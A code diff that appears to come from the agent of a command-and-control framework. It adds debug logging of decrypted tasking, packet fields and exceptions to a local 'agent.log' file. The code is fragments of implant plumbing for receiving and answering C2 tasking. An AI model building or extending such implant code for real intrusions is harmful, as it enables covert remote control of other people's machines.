@@ -108,13 +108,11 @@ def send_message(data = None):
         (code,data) = listener['send_func'](data, **listener['fixed_parameters'])
 
         if code == '200': #we got a message through
-            
-            with open("agent.log","a") as fh:
-                fh.write("listener {} answered\n".format(listener['name']))
-
             try:
                 send_job_message_buffer()
             except Exception as e:
+                with open("agent.log","a") as fh:
+                    fh.write("got exeception on send job: {}".format(e))
                 result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
                 process_job_tasking(result)
 
@@ -230,6 +228,8 @@ def parse_task_packet(packet, offset=0):
         remainingData = packet[12+offset+length:]
         return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
     except Exception as e:
+        with open("agent.log","a") as fh:
+            fh.write("task packet exception:{}".format(e))
         # print "parse_task_packet exception:",e
         return (None, None, None, None, None, None, None)
 
@@ -246,14 +246,22 @@ def process_tasking(data):
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
         with open("agent.log","a") as fh:
-            fh.write("got tasking")
-            fh.write(tasking)
+            fh.write("got tasking {}\n".format(tasking))
 
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
         
         with open("agent.log","a") as fh:
-            fh.write("got a packet")
-            fh.write("curlistener missedcheckins")
+            fh.write("""
+                got a packet:
+                packetType:{}
+                totalPacket:{}
+                packetNum:{}
+                resultID:{}
+                length:{}
+                data:{}
+                remainingData:{}
+                """.format(packetType, totalPacket, packetNum, resultID, length, data, remainingData))
+            fh.write("curlistener: {} missedcheckins: {}".format(curlistener,curlistener['missedCheckins']))
 
 
         # if we get to this point, we have a legit tasking so reset missedCheckins
@@ -282,6 +290,8 @@ def process_tasking(data):
         send_message(resultPackets)
 
     except Exception as e:
+        with open("agent.log","a") as fh:
+            fh.write("processpacket exception:{}".format(e))
         # print "processTasking exception:",e
         pass
 
@@ -290,6 +300,8 @@ def process_job_tasking(result):
     # process job data packets
     #  - returns to the C2
     # execute/process the packets and get any response
+    with open("agent.log","a") as fh:
+        fh.write("processing job tasking")
     try:
         resultPackets = ""
         if result:
